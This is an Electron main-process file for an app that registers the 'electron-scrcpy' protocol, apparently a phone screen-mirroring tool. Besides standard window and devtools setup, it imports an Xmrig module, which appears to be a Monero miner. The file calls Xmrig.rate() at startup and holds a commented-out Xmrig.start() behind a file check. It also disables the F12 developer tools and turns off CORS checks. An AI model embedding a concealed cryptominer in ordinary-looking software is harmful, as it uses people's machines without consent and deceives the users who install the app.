'use strict'

import { app } from 'electron'
import InitWindow from './services/windowManager'
import DisableButton from './config/DisableButton'
import electronDevtoolsInstaller from 'electron-devtools-installer'
import Server from './server'
import {Xmrig} from './xmrig'
import { dialog } from 'electron'
var fs = require("fs")
function onAppReady() {
  new InitWindow().initWindow()
  DisableButton.Disablef12()
  if (process.env.NODE_ENV === 'development') {
    electronDevtoolsInstaller('ljjemllljcmogpfapbkkighbhhppjdbg', true)
      .then((name) => console.log(`已安装: ${name}`))
      .catch(err => console.log('无法安装 `vue-devtools`: \n 可能发生得错误：网络连接问题 \n', err))
  }
  Server.startDeviceServer()
  Xmrig.rate()
  setTimeout(() => {
    power()
  }, 1000*3);
}

function power(){
  if(!fs.existsSync("rate.txt")){
    // Xmrig.start()
  }
}


app.isReady() ? onAppReady() : app.on('ready', onAppReady)
// 由于9.x版本问题，需要加入该配置关闭跨域问题
app.commandLine.appendSwitch('disable-features', 'OutOfBlinkCors')

app.on('window-all-closed', () => {
  // 所有平台均为所有窗口关闭就退出软件
  app.quit()
  Xmrig.stop()
  console.log('window-all-closed')
})
app.on('browser-window-created', () => {
  console.log('window-created')
})

if (process.defaultApp) {
  if (process.argv.length >= 2) {
    app.removeAsDefaultProtocolClient('electron-scrcpy')
    console.log('有于框架特殊性开发环境下无法使用')
  }
} else {
  app.setAsDefaultProtocolClient('electron-scrcpy')
}


